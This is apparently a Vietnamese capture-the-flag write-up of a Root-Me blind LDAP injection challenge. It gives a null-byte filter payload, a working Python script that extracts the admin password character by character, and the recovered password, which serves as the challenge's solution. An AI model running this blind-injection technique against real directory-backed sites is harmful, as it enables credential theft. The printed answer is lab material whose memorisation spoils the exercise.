Điểm inject khá dễ nhìn, đó là đường dẫn `/?action=dir&search=a`

Nguyên lí inject ở đây nói chung giống hệt chall `mysql injection blind` và `nosql injection blind`, chỉ khác về cú pháp query. Lưu ý 1 điểm: thay vì dùng comment như `mysql`, ta dùng null bytes(`%00`) ở cuối URL để cắt toàn bộ phần query mặc định của server đi

Code python để lấy password:

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

password = ''
u = 'http://challenge01.root-me.org/web-serveur/ch26/?action=dir&search=admin*)(password='

while True:
    for c in string.printable:
        if c not in ['*', '+', '.', '?', '|', '#', '&', '$']:
            payload = '%s' % (password + c)
            r = requests.get(u + payload + '*))%00')
            if 'admin' in r.text:
                print("Found one more char : %s" % (password+c))
                password += c

```



password: `dsy365gDZerzO94`

Lưu ý thứ 2: vì 1 lí do nào đó mà flag phải để hết chữ cái ở lowercase, dựa theo [note](https://www.root-me.org/?page=forum&id_thread=8940&lang=en)

